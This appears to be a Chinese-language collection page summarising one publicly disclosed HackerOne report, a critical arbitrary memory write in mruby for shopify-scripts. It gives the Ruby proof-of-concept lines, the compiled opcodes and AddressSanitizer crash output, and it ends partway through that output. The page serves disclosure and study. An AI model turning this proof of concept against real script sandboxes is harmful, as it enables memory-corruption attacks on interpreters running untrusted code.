# HackerOne 实战案例：write-what-where-condition

_1 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write
- 等级：Critical | 项目：shopify-scripts | 披露：2017-05-30 | CVE：-
- 原文：https://hackerone.com/reports/226200

- - - - - - - - 
# PoC
	x = 0x4242422a
	a = *(_&.__=0)
	a = *(_&.__=0)
    
# Generated Opcodes
	irep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0
	file: crashes/b.rb
	    3 000 OP_LOADL	R1	L(0)	; 1111638570	; R1:x
	    4 001 OP_ARRAY	R3	R3	0
	    4 002 OP_LOADI	R4	0
	    4 003 OP_ARYCAT	R2	R3		; R2:a
	    5 004 OP_ARRAY	R2	R2	0	; R2:a R2:a
	    5 005 OP_LOADI	R3	0
	    5 006 OP_ARYCAT	R1	R2		; R1:x R2:a
	    5 007 OP_MOVE	R2	R1		; R2:a R1:x
	    5 008 OP_STOP
# AddressSanitizer
    unknown lhs 30
    unknown lhs 30
    ASAN:SIGSEGV
    =================================================================
    ==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 

